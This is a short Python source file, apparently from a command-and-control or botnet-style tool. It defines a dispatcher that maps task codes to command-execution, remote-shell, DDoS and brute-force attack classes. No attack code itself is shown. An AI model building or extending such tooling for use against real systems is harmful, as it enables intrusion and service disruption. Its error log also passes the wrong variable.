#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

from app.models import *

def get_plugin(task_type):
    plugins = {
        "cmd": tasks.Command,
        "rsh": tasks.RemoteShellSession,
        "dos": attacks.DDosAttack,
        "brt": attacks.BruteForceAttack
    }
    Plugin = None
    from app import logger
    logger.log('trying to get plugin for task_type: {}'.format(task_type), 'DEBUG')
    for plugin in plugins:
        if task_type == plugin:
            Plugin = plugins[plugin]
            break
    if Plugin is not None:
        logger.log('plugin retrieved: {}'.format(Plugin), 'DEBUG')
    else:
        logger.log('error trying to retrive plugin for task_type <{}>'.format(Plugin), 'ERROR')
    return Plugin